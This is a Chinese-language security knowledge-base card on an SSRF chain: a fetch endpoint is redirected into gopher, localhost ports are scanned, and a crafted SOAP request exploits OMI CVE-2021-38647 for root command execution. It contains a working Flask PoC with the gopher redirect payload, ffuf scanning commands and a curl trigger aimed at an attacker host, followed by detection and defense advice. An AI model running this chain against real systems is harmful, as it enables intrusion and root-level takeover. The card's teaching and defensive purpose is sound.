---
id: web-generic-ssrf-redirect-gopher-localhost-portscan-omi
title: SSRF 经 301 重定向进入 gopher：localhost 端口扫描与任意 TCP 报文打 OMI
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-redirect-gopher-localhost-portscan
tags:
- web
- ssrf
- gopher
- redirect
- port-scan
- omi
- rce
- localhost
cve:
- CVE-2021-38647
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: OMI：affected from 16.0 before OMI Version 1.6.8-1（原文标记；1.6.8-1 于 2021-09-08 发布修复）
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T11:58:49+08:00'
  notes: 已对照全文与19张图核对：图01显示 Jarmis 已解出；ffuf 命中 22/80/5986/8001（未开放响应109字节），手动复测 5985；MSF 401 模块改 RedirectURL 后 jarmis 跟随 301 到 Flask，再 301 到 gopher://localhost:5985，xxd 图19确认 gopher 追加 \r\n，Content-Length 需 len(body)+2；nc 收到 root shell（图未列出但正文有）。已修正卡内端口扫描 oracle 的 endpoint 字段为实际响应的 127.0.0.1:<port>。未验证点：PoC 未在本机执行；affected_versions 沿用原文 OMI 区间（本卡为 SSRF 链，版本约束仅针对末端 OMI）。frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/generic/ssrf/web-generic-ssrf-redirect-gopher-localhost-portscan-omi/
draft: false
kb_aliases:
- 重定向到 gopher SSRF
- SSRF localhost 端口扫描
- gopher 构造 SOAP 打 OMI
- Jarmis fetch SSRF
- SSRF 任意 TCP 报文
---

## 一句话结论

当应用的 URL 抓取接口接受 `host:port` 形式的输入、在服务端发起请求并跟随 301/302 重定向时，攻击者可以先用响应差异扫描 `localhost` 上的内部端口，再让攻击者服务器返回 `Location: gopher://localhost:PORT/_<编码后的原始报文>`，借 gopher 协议向仅监听回环地址的内部服务发送任意 TCP 报文（包括 POST/SOAP）；配合 OMI 的 CVE-2021-38647 认证绕过即可在目标主机上以 root 执行命令。

## 原理

- **SSRF 入口**：类似 `/api/v1/fetch?endpoint=<host:port/path>` 的接口会把 `endpoint` 拼成 URL 在服务端请求，并把结果（签名、endpoint、note、server 等）返回。攻击者控制 endpoint，就控制了服务端要访问的目标。
- **端口扫描 oracle**：对开放端口，响应中的 `endpoint` 字段为 `127.0.0.1:<port>`（原文文字称 `localhost:<port>`，实际响应已归一化为 127.0.0.1）；对未开放端口，字段为 `null`。两者响应体大小不同，可用 `ffuf -fs <未开放响应大小>` 过滤出开放端口。注意 `localhost` 与 `127.0.0.1` 的解析结果可能不一致，等价写法要分别测试。
- **重定向**：服务端 HTTP 客户端跟随 301/302，且不限制跳转后的 scheme。攻击者服务器返回 `Location: gopher://localhost:5985/_<data>`，客户端就会用 gopher 协议访问内网。
- **gopher 原语**：`gopher://host:port/_<data>` 会把 URL 解码后的 `<data>` 原样写入 TCP 连接；`_` 是类型选择器占位符（不写可能解析出错）。因此 data 可以是一份完整的 HTTP 请求（请求行、Host、Content-Length、Content-Type、body），gopher 相当于任意 TCP 报文发送器。
- **CRLF 细节**：gopher 传输时会自动追加 `\r\n`，所以构造的 HTTP 报文实际 body 比 `Content-Length` 多 2 字节；对 Content-Length 敏感的服务（如 OMI）会直接拒绝，需把 `Content-Length` 写成 `len(body)+2`。
- **OMI 认证绕过**：OMI 的 WS-Management 服务在 5985（HTTP）/5986（HTTPS）监听。其授权逻辑在请求未带 `Authorization` 头时不会触发认证流程，`authFailed` 保持初始 `false`，于是请求被当作已认证用户处理；OMI 默认以 root 运行，`ExecuteShellCommand` 即 root 命令执行。
- 为什么用 5985 而不是 5986：gopher 无法完成 TLS 握手，5986 是 HTTPS，gopher 直接发明文会失败；5985 是 HTTP，可直接发 SOAP。若 5985 未开放，需另找可发明文的服务。

## 触发条件

- 存在服务端 URL 抓取/预览/回调接口，host/port 或完整 URL 可控；
- 服务端跟随重定向，且未限制跳转后的 scheme（允许 gopher/dict 等）；
- 内部服务只监听 localhost 或仅信任回环来源；
- 攻击者能通过响应差异或时间差异判断端口开放；
- 目标运行存在 CVE-2021-38647 的 OMI（1.6.8-1 之前，即未安装 2021-09-08 的安全修复），且 5985 可达。

## 利用步骤

1. 用 `endpoint=<attacker-ip>:<port>` 请求，确认攻击者服务器收到请求，证明 SSRF。
2. 扫描 localhost：`ffuf -u http://target/api/v1/fetch?endpoint=localhost:FUZZ -w ports.txt -fs <未开放响应大小>`；对候选端口手动复测，避免高并发导致的 502/503/超时误判。
3. 在攻击者服务器上启动一个返回 301 的服务，`Location` 指向 `gopher://localhost:<target-port>/_<urlencoded raw request>`。
4. 构造内部服务的原始 HTTP 报文；对 OMI，使用 SOAP `ExecuteShellCommand`，命令可 base64 编码避免特殊字符。
5. 把 `Content-Length` 设为 `len(body)+2`，对整个报文做 URL 编码（`urllib.parse.quote`），拼到 gopher URL。
6. 让 fetch 接口访问攻击者重定向服务；服务端跟随 301 到 gopher，向 localhost:5985 发送 SOAP，OMI 以 root 执行命令并反弹 Shell。

## PoC

```python
# 攻击者重定向服务：301 到 gopher，发送原始 HTTP POST
from flask import Flask, redirect
from urllib.parse import quote

app = Flask(__name__)
command = "echo '<base64-cmd>' | base64 -d | bash"
body = f"""<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" ...>
  <s:Header>...</s:Header>
  <s:Body>
    <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
      <p:command>{command}</p:command><p:timeout>0</p:timeout>
    </p:ExecuteShellCommand_INPUT>
  </s:Body>
</s:Envelope>"""
length = len(body) + 2  # gopher 会自动追加 CRLF
raw = (
    f"POST / HTTP/1.1\r\n"
    f"Host: localhost:5985\r\n"
    f"Content-Length: {length}\r\n"
    f"Content-Type: application/soap+xml;charset=UTF-8\r\n\r\n{body}"
)

@app.route("/")
def root():
    return redirect(f"gopher://localhost:5985/_{quote(raw, safe='')}", code=301)

app.run(host="0.0.0.0", port=4444)
```

```bash
# 端口扫描 oracle
seq 1 65535 > tcp-ports
ffuf -u http://target/api/v1/fetch?endpoint=localhost:FUZZ -w tcp-ports -fs 109
# 命中 22/80/5986/8001，手动复测发现 5985 开放

# 触发重定向
curl 'http://target/api/v1/fetch?endpoint=<attacker-ip>:4444/'
```

## 变体与关联

- 变体：重定向到 `dict://`、`file://`、`http://127.0.0.1`；gopher 也可打 Redis inline 协议、FastCGI、未授权 HTTP 管理接口。
- 变体：若只允许 http/https，可先重定向到 http 内网服务，再用其他漏洞；或寻找支持 `gopher` 的客户端（curl、Go net/http 默认不支持 gopher，需确认实现）。
- 变体：端口扫描也可用时间差异、错误码差异；`localhost`/`127.0.0.1`/`[::1]` 的解析差异可用于绕过黑名单。
- 关联：[[web-generic-ssrf-curl-gopher-loopback-admin]]（curl 直接执行用户 URL 的 gopher SSRF；本卡补充“重定向进入 gopher”与端口扫描 oracle）。
- 关联：[[web-generic-ssrf-gopher-fastcgi-fpm-auto-prepend]]、[[web-generic-ssrf-redis-inline-protocol-crlf]]（gopher 打其他内部服务）。
- 关联：[[web-generic-auth-missing-function-level-role-check]]（若内部管理接口只验登录不验角色，也可作为 SSRF 目标）。
- 影响边界：需要 SSRF 客户端支持 gopher 且跟随重定向；若客户端限制 scheme、禁用重定向或做 DNS/IP 校验，本链失效；OMI 需未打补丁且 5985 可达。

## 检测与防御

- 检测：服务端对 `localhost`/`127.0.0.1` 的大量端口请求；URL 抓取接口出现 301/302 后跳到非 http(s) scheme；出站连接中出现 gopher 流量或对回环地址的异常 TCP 连接。
- 检测：同一来源先访问攻击者域名、随后访问内网端口的请求序列；响应大小/时间差异扫描特征（大量 404/连接失败）。
- 防御：URL 抓取只允许 http/https，禁止 gopher/dict/file；禁止跟随重定向或对每一跳重新校验 scheme、host、解析后的 IP；阻断私网/回环/链路本地地址。
- 防御：管理服务不要只信任回环来源，加独立 token/mTLS；OMI 升级到 1.6.8-1 及以上（该版本于 2021-09-08 发布安全修复）；限制出站访问，使用 egress 代理与白名单。
- 防御：对 URL 抓取接口做速率限制与审计，监控异常端口扫描与重定向链。
